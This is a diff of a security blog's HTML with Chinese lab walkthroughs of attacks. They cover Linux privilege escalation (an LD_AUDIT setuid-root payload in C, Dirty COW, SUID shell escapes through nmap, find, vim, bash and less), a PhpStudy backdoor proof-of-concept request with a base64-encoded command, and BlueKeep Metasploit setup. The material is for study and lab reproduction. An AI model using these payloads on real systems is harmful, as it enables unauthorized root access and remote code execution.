+<pre class="line-numbers language-java"><code class="language-java">ln <span class="token operator">/</span>bin<span class="token operator">/</span>ping <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>target
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>4.查看target文件权限</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>target
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>5.把target文件加载到内存中</p>
+<pre class="line-numbers language-java"><code class="language-java">exec <span class="token number">3</span><span class="token operator">&lt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>target
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>6.查看target在内存的状态</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>proc<span class="token operator">/</span>$$<span class="token operator">/</span>fd<span class="token operator">/</span><span class="token number">3</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>7.删除target文件</p>
+<pre class="line-numbers language-java"><code class="language-java">rm <span class="token operator">-</span>rf <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>8.再次查看target在内存的状态</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>proc<span class="token operator">/</span>$$<span class="token operator">/</span>fd<span class="token operator">/</span><span class="token number">3</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>9.创建一个c语言代码</p>
 <p><code>vim payload.c</code></p>
-<pre><code>void __attribute__((constructor)) init()  // 两个下划线
-{
-     setuid(0);
-     system(&quot;/bin/bash&quot;);
-}
-</code></pre><p>10.利用gcc编译这段代码</p>
-<pre><code>gcc -W -fPIC -shared -o /tmp/exploit payload.c
-</code></pre><p>11.提升到root权限</p>
-<pre><code>LD_AUDIT=&quot;\$ORIGIN&quot; exec /proc/self/fd/3
-ERROR: ld.so: object &#39;$ORIGIN&#39; cannot be loaded as audit interface: cannot open shared object file; ignored.
-Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
-            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
-            [-M mtu discovery hint] [-S sndbuf]
-            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
-</code></pre><p><img src="/images/5/1.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 两个下划线</span>
+<span class="token punctuation">{</span>
+     <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>10.利用gcc编译这段代码</p>
+<pre class="line-numbers language-java"><code class="language-java">gcc <span class="token operator">-</span>W <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>o <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit payload<span class="token punctuation">.</span>c
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>11.提升到root权限</p>
+<pre class="line-numbers language-java"><code class="language-java">LD_AUDIT<span class="token operator">=</span><span class="token string">"\$ORIGIN"</span> exec <span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>fd<span class="token operator">/</span><span class="token number">3</span>
+ERROR<span class="token operator">:</span> ld<span class="token punctuation">.</span>so<span class="token operator">:</span> object <span class="token string">'$ORIGIN'</span> cannot be loaded as audit <span class="token keyword">interface</span><span class="token operator">:</span> cannot open shared object file<span class="token punctuation">;</span> ignored<span class="token punctuation">.</span>
+Usage<span class="token operator">:</span> ping <span class="token punctuation">[</span><span class="token operator">-</span>LRUbdfnqrvVaA<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>c count<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>i interval<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>w deadline<span class="token punctuation">]</span>
+            <span class="token punctuation">[</span><span class="token operator">-</span>p pattern<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>s packetsize<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>t ttl<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>I <span class="token keyword">interface</span> <span class="token class-name">or</span> address<span class="token punctuation">]</span>
+            <span class="token punctuation">[</span><span class="token operator">-</span>M mtu discovery hint<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>S sndbuf<span class="token punctuation">]</span>
+            <span class="token punctuation">[</span> <span class="token operator">-</span>T timestamp option <span class="token punctuation">]</span> <span class="token punctuation">[</span> <span class="token operator">-</span>Q tos <span class="token punctuation">]</span> <span class="token punctuation">[</span>hop1 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> destination
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/5/1.png" alt></p>
 <p>等到执行完之后就是root权限了。这是一个老版本的gcc编译器漏洞了，虽然老，但是还是学习一下的好。</p>
 <h2 id="sudo配置错误"><a href="#sudo配置错误" class="headerlink" title="sudo配置错误"></a>sudo配置错误</h2><p>这个方法是在freebuf上的一篇文章上看到的，但是实际情况下还没有见到过。</p>
 <p>1.查看 <code>/home/</code>目录下是否有<code>.sudo_as_admin_successful</code>文件，如果有的话直接可以输入当前低权限账号的密码直接<code>sudo su</code>切换为root用户。</p>
@@ -590,37 +789,41 @@ Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="内核，操作系统和设备信息"><a href="#内核，操作系统和设备信息" class="headerlink" title="内核，操作系统和设备信息"></a>内核，操作系统和设备信息</h2><pre><code>uname -a    打印所有可用的系统信息
-uname -r    内核版本
-uname -n    系统主机名
-uname -m    查看系统内核架构（64位/32位）
+    <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="内核，操作系统和设备信息"><a href="#内核，操作系统和设备信息" class="headerlink" title="内核，操作系统和设备信息"></a>内核，操作系统和设备信息</h2><pre class="line-numbers language-java"><code class="language-java">uname <span class="token operator">-</span>a    打印所有可用的系统信息
+uname <span class="token operator">-</span>r    内核版本
+uname <span class="token operator">-</span>n    系统主机名
+uname <span class="token operator">-</span>m    查看系统内核架构（<span class="token number">64</span>位<span class="token operator">/</span><span class="token number">32</span>位）
 hostname    系统主机名
-cat /proc/version    内核信息
-cat /etc/*-release   分发信息
-cat /etc/issue       分发信息
-cat /proc/cpuinfo    CPU信息
-</code></pre><h2 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h2><pre><code>cat /etc/passwd     列出系统上的所有用户
-cat /etc/group      列出系统上的所有组
-grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;
+cat <span class="token operator">/</span>proc<span class="token operator">/</span>version    内核信息
+cat <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">-</span>release   分发信息
+cat <span class="token operator">/</span>etc<span class="token operator">/</span>issue       分发信息
+cat <span class="token operator">/</span>proc<span class="token operator">/</span>cpuinfo    CPU信息
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h2><pre class="line-numbers language-java"><code class="language-java">cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd     列出系统上的所有用户
+cat <span class="token operator">/</span>etc<span class="token operator">/</span>group      列出系统上的所有组
+grep <span class="token operator">-</span>v <span class="token operator">-</span>E <span class="token string">"^#"</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token operator">|</span> awk <span class="token operator">-</span>F<span class="token operator">:</span> <span class="token string">'$3 == 0 { print $1}'</span>
                     列出所有的超级用户账户
 whoami              查看当前用户
 w                   谁目前已登录，他们正在做什么
 last                最后登录用户的列表
 lastlog             所有用户上次登录的信息
-lastlog –u %username%  有关指定用户上次登录的信息
-lastlog |grep -v &quot;Never&quot;  以前登录用户的完整列表
-</code></pre><h2 id="用户和权限信息："><a href="#用户和权限信息：" class="headerlink" title="用户和权限信息："></a>用户和权限信息：</h2><pre><code>whoami        当前用户名
+lastlog –u <span class="token operator">%</span>username<span class="token operator">%</span>  有关指定用户上次登录的信息
+lastlog <span class="token operator">|</span>grep <span class="token operator">-</span>v <span class="token string">"Never"</span>  以前登录用户的完整列表
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="用户和权限信息："><a href="#用户和权限信息：" class="headerlink" title="用户和权限信息："></a>用户和权限信息：</h2><pre class="line-numbers language-java"><code class="language-java">whoami        当前用户名
 id            当前用户信息
-cat /etc/sudoers  谁被允许以root身份执行
-sudo -l       当前用户可以以root身份执行操作
-</code></pre><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><pre><code>env        显示环境变量
+cat <span class="token operator">/</span>etc<span class="token operator">/</span>sudoers  谁被允许以root身份执行
+sudo <span class="token operator">-</span>l       当前用户可以以root身份执行操作
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><pre class="line-numbers language-java"><code class="language-java">env        显示环境变量
 set        现实环境变量
-echo %PATH 路径信息
+echo <span class="token operator">%</span>PATH 路径信息
 history    显示当前用户的历史命令记录
 pwd        输出工作目录
-cat /etc/profile   显示默认系统变量
-cat /etc/shells    显示可用的shell
-</code></pre><p>更多参考 -&gt; <a href="https://www.rebootuser.com/?p=1623" target="_blank" rel="noopener">https://www.rebootuser.com/?p=1623</a></p>
+cat <span class="token operator">/</span>etc<span class="token operator">/</span>profile   显示默认系统变量
+cat <span class="token operator">/</span>etc<span class="token operator">/</span>shells    显示可用的shell
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>更多参考 -&gt; <a href="https://www.rebootuser.com/?p=1623" target="_blank" rel="noopener">https://www.rebootuser.com/?p=1623</a></p>
 <h1 id="内核漏洞exp提权"><a href="#内核漏洞exp提权" class="headerlink" title="内核漏洞exp提权"></a>内核漏洞exp提权</h1><h2 id="脏牛漏洞本地提权"><a href="#脏牛漏洞本地提权" class="headerlink" title="脏牛漏洞本地提权"></a>脏牛漏洞本地提权</h2><p><strong>漏洞描述：</strong><br>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权<br>影响范围：Linux kernel &gt;=2.6.22  并且Android也受影响</p>
 <p><strong>脏牛漏洞名称的来源：</strong></p>
 <blockquote>
@@ -631,12 +834,13 @@ cat /etc/shells    显示可用的shell
 <p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。</p>
 </blockquote>
 <p><strong>漏洞复现过程：</strong><br>靶机：CentOS 6.5<br>1.查看linux内核版本是否大于等于2.6.22<br><code>uname -a</code><br>2.上传POC至 /tmp 目录下（tmp目录具有较高权限）<br><img src="/images/4/1.png" alt><br>3.对dirty.c进行gcc编译生成一个可执行文件</p>
-<pre><code>gcc -pthread dirty.c -o dirty -lcrypt
- ***       
- -pthread会附加一个宏定义-D_REENTRANT该宏会导致libc头文件选择那些thread-safe的实现
- -o  为编译后输出的文件名
- ***
-</code></pre><p><img src="/images/4/2.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java">gcc <span class="token operator">-</span>pthread dirty<span class="token punctuation">.</span>c <span class="token operator">-</span>o dirty <span class="token operator">-</span>lcrypt
+ <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>       
+ <span class="token operator">-</span>pthread会附加一个宏定义<span class="token operator">-</span>D_REENTRANT该宏会导致libc头文件选择那些thread<span class="token operator">-</span>safe的实现
+ <span class="token operator">-</span>o  为编译后输出的文件名
+ <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/4/2.png" alt></p>
 <p>4.运行dirty可执行文件进行本地提权<br><code>./dirty passwd</code><br>这个漏洞的执行时间将近三分钟，耐心等待之后即可出现<br><img src="/images/4/3.png" alt></p>
 <p>此时切换到firefart用户，密码为123456<br><img src="/images/4/4.png" alt><br>执行 id 命令后可以看到已经时root用户了，成功提权。</p>
 <h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>如果linux内核版本小于2.6.22或者脏牛无法成功时，我们需要查看其他版本的内核漏洞。这时我们就用到了kali linux，自身所拥有的searchspolit可以帮助我们查看各种linux发行版本的漏洞。而searchs<br>polit的使用也很简单，只需要在后面跟上限定条件即可。<br>查看linux 的漏洞<br><code>searchspolit linux</code><br><img src="/images/4/5.png" alt><br>查看centos6的漏洞<br><code>searchspolit centos 6</code><br><img src="/images/4/6.png" alt><br>通常所用的是查看指定内核版本和linux的发行版本。如：<br><code>searchspolit centos 7 kernel 3.10</code><br><img src="/images/4/7.png" alt><br>所限定的条件越多，当然可利用的漏洞也就越少。我们选中其中符合靶机环境的漏洞后进行查看。<br>利用leafpad命令查看文档内容并且复制到靶机上生成相应的文件。（漏洞的利用虽然是英文，但是一定要看一下使用方法）<br><code>leafpad /usr/share/exploitdb/exploits/linux/dos/41350.c</code><br><img src="/images/4/8.png" alt><br>更多关于searchspolit可以浏览   –&gt; <a href="https://xz.aliyun.com/t/2860" target="_blank" rel="noopener">https://xz.aliyun.com/t/2860</a></p>
@@ -649,12 +853,13 @@ cat /etc/shells    显示可用的shell
 <p>那么什么是suid提权呢？我理解的就是有个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，不然没什么用处，那么我们就能从普通用户提升到了root权限了。</p>
 </blockquote>
 <p>首先在本地查找符合条件的文件</p>
-<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
-find / -perm -u=s -type f 2&gt;/dev/null
-find / -user root -perm -4000 -exec ls -ldb {} \;
-</code></pre><p><img src="/images/4/9.png" alt><br>所列出来的文件都是以root用户权限来执行的，接下来找到可以提权的文件。</p>
+<pre class="line-numbers language-java"><code class="language-java">find <span class="token operator">/</span> <span class="token operator">-</span>user root <span class="token operator">-</span>perm <span class="token operator">-</span><span class="token number">4000</span> <span class="token operator">-</span>print <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>null
+find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>null
+find <span class="token operator">/</span> <span class="token operator">-</span>user root <span class="token operator">-</span>perm <span class="token operator">-</span><span class="token number">4000</span> <span class="token operator">-</span>exec ls <span class="token operator">-</span>ldb <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/4/9.png" alt><br>所列出来的文件都是以root用户权限来执行的，接下来找到可以提权的文件。</p>
 <p>常见的可用于suid提权的命令</p>
-<pre><code>Nmap
+<pre class="line-numbers language-java"><code class="language-java">Nmap
 Vim
 find
 Bash
@@ -662,24 +867,29 @@ More
 Less
 Nano
 cp
-</code></pre><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。）<br>可以使用下命令进入namp交互模式<br><code>nmap --interactive</code></p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。）<br>可以使用下命令进入namp交互模式<br><code>nmap --interactive</code></p>
 <p>执行命令之后会返回一个shell</p>
-<pre><code>namp&gt; !sh
-sh-3.2# whoami
+<pre class="line-numbers language-java"><code class="language-java">namp<span class="token operator">></span> <span class="token operator">!</span>sh
+sh<span class="token operator">-</span><span class="token number">3.2</span># whoami
 root
-</code></pre><p><img src="/images/4/10.png" alt><br>在Metasploit中也有一个模块可以通过SUID Namp进行提权<br><code>exploit/unix/local/setuid_nmap</code></p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/4/10.png" alt><br>在Metasploit中也有一个模块可以通过SUID Namp进行提权<br><code>exploit/unix/local/setuid_nmap</code></p>
 <h2 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h2><p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
-<pre><code>touch test
-find test -exec whoami \;
-</code></pre><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。<br><code>vim /etc/shadow</code></p>
+<pre class="line-numbers language-java"><code class="language-java">touch test
+find test <span class="token operator">-</span>exec whoami \<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。<br><code>vim /etc/shadow</code></p>
 <p><img src="/images/4/11.png" alt></p>
 <h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>以下命令将以root身份打开一个bash shell。</p>
-<pre><code>bash -p
-bash-3.2# id
-</code></pre><h2 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h2><p>程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令</p>
-<pre><code>less /etc/passwd
-!/bin/sh
-</code></pre>
+<pre class="line-numbers language-java"><code class="language-java">bash <span class="token operator">-</span>p
+bash<span class="token operator">-</span><span class="token number">3.2</span># id
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h2><p>程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令</p>
+<pre class="line-numbers language-java"><code class="language-java">less <span class="token operator">/</span>etc<span class="token operator">/</span>passwd
+<span class="token operator">!</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
     
 
     
@@ -784,24 +994,26 @@ bash-3.2# id
 <p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。<br>然而，如此绿色无公害的“国民”开发软件遭到了黑客的毒手，并且犯罪动机竟然出自黑客的技痒和虚荣心。据杭州公安披露，黑客组织早在2016年就编写了“后门”文件，并非法侵入了PhpStudy的官网，篡改了软件安装包植入“后门”。而该“后门”具有控制计算机的功能，可以远程控制下载运行脚本实现用户个人信息收集。<br>从2016年起，黑客利用该“后门”犯罪作恶一发不可收拾，大量中招的电脑沦为“肉鸡”执行危险命令，不计其数的用户账号密码、电脑数据、敏感信息被远程抓取和回传。据统计，黑客已控制了超过67万台电脑，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，而此案也是2019年以来，国内影响最为严重的供应链攻击事件。</p>
 </blockquote>
 <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>紧接着老大发来了POC，所以赶紧复现一波。</p>
-<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>GET /110.php HTTP/1.1
-Host: 192.168.199.186
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.9
-Accept-Encoding:gzip,deflate
-Accept-Charset:c3lzdGVtKCd3aG9hbWknKTs=
-Cookie:UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
-Connection: close</code></pre><p><code>c3lzdGVtKCd3aG9hbWknKTs=这是你要执行的命令的base64加密，且请求报文除GET和Host外不能变动</code></p>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre class="line-numbers language-java"><code class="language-java">GET <span class="token operator">/</span><span class="token number">110</span><span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token operator">:</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">199.186</span>
+Cache<span class="token operator">-</span>Control<span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token operator">:</span> <span class="token number">1</span>
+User<span class="token operator">-</span>Agent<span class="token operator">:</span> Mozilla<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">.</span><span class="token function">0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537</span><span class="token punctuation">.</span><span class="token function">36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">63.0</span><span class="token punctuation">.</span><span class="token number">3239.132</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
+Accept<span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>
+Accept<span class="token operator">-</span>Language<span class="token operator">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
+Accept<span class="token operator">-</span>Encoding<span class="token operator">:</span>gzip<span class="token punctuation">,</span>deflate
+Accept<span class="token operator">-</span>Charset<span class="token operator">:</span>c3lzdGVtKCd3aG9hbWknKTs<span class="token operator">=</span>
+Cookie<span class="token operator">:</span>UM_distinctid<span class="token operator">=</span>16ae380e49f27e<span class="token operator">-</span>0987ab403bca49<span class="token operator">-</span>3c604504<span class="token operator">-</span>1fa400<span class="token operator">-</span>16ae380e4a011b<span class="token punctuation">;</span> CNZZDATA3801251<span class="token operator">=</span>cnzz_eid<span class="token operator">%</span>3D1063495559<span class="token operator">-</span><span class="token number">1558595034</span><span class="token operator">-</span><span class="token operator">%</span>26ntime<span class="token operator">%</span>3D1559102092<span class="token punctuation">;</span> CNZZDATA1670348<span class="token operator">=</span>cnzz_eid<span class="token operator">%</span>3D213162126<span class="token operator">-</span><span class="token number">1559207282</span><span class="token operator">-</span><span class="token operator">%</span>26ntime<span class="token operator">%</span>3D1559207282
+Connection<span class="token operator">:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>c3lzdGVtKCd3aG9hbWknKTs=这是你要执行的命令的base64加密，且请求报文除GET和Host外不能变动</code></p>
 <p>在访问正常已存在的php文件时抓包将POC中的数据替换到burp中发送即可</p>
 <p><img src="/images/2/1.png" alt><br>可以看到可以远程命令执行</p>
 <h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>目前影响的版本为2016，2018中的</p>
-<pre><code>php-5.1.17 + Apache
-php-5.4.45 + Apache
-php-5.2.17 + Nginx
-</code></pre>
+<pre class="line-numbers language-java"><code class="language-java">php<span class="token operator">-</span><span class="token number">5.1</span><span class="token punctuation">.</span><span class="token number">17</span> <span class="token operator">+</span> Apache
+php<span class="token operator">-</span><span class="token number">5.4</span><span class="token punctuation">.</span><span class="token number">45</span> <span class="token operator">+</span> Apache
+php<span class="token operator">-</span><span class="token number">5.2</span><span class="token punctuation">.</span><span class="token number">17</span> <span class="token operator">+</span> Nginx
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
     
 
     
@@ -1001,36 +1213,41 @@ php-5.2.17 + Nginx
 <p>攻击机ip（kali linux）：192.168.1.105<br>靶   机ip（win7  SP1) ：192.168.1.106<br>win7 SP1 镜像地址：<br><code>ed2k://|file|cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso|3420557312|430BEDC0F22FA18001F717F7AF08C9D5|/</code></p>
 <p>CVE-2019-0708利用套件：<br><code>https://pan.baidu.com/s/1HqmKbp4ZjMsUm0gRlTEVFQ 提取码: vkqw</code></p>
 <h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h1><p>复现的时候也是有很多问题，我使用的metasploit的版本是5.0.22，所以无法适配最新的cve-2019-0708漏洞的套件，所以要在kali中更新一波metasploit。<br>执行两行代码可直接更新：</p>
-<pre><code>apt-get update
-apt-get install metasploit-framework</code></pre><p><img src="/images/3/1.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java">apt<span class="token operator">-</span>get update
+apt<span class="token operator">-</span>get install metasploit<span class="token operator">-</span>framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/3/1.png" alt></p>
 <p>更新过后即可将套件放至各个模块文件下，但是在这个过程中我所看到的博客里面看到的都是一个路径，而这个路径是手动安装metasploit时候的安装路径，所以在放至路径的时候出错将会出现如下错误。</p>
-<pre><code>[-] 192.168.1.106:3389 - Exploit failed: NameError undefined local variable or method `rdp_connect&#39; for #&lt;Msf::Modules::Exploit__Windows__Rdp__Cve_2019_0708_bluekeep_rce::MetasploitModule:0x00007f9c251837b0&gt;</code></pre><p>复现过程中这个也是最浪费时间的一个地方了，最后在kali linux 论坛中找到了kali中metasploit的模块路径。在下载套件之后将文件移动到各个文件夹下即可</p>
-<pre><code>rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit 
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.106</span><span class="token operator">:</span><span class="token number">3389</span> <span class="token operator">-</span> Exploit failed<span class="token operator">:</span> NameError undefined local variable or method `rdp_connect' <span class="token keyword">for</span> #<span class="token operator">&lt;</span>Msf<span class="token operator">:</span><span class="token operator">:</span>Modules<span class="token operator">:</span><span class="token operator">:</span>Exploit__Windows__Rdp__Cve_2019_0708_bluekeep_rce<span class="token operator">:</span><span class="token operator">:</span>MetasploitModule<span class="token operator">:</span><span class="token number">0x00007f9c251837b0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>复现过程中这个也是最浪费时间的一个地方了，最后在kali linux 论坛中找到了kali中metasploit的模块路径。在下载套件之后将文件移动到各个文件夹下即可</p>
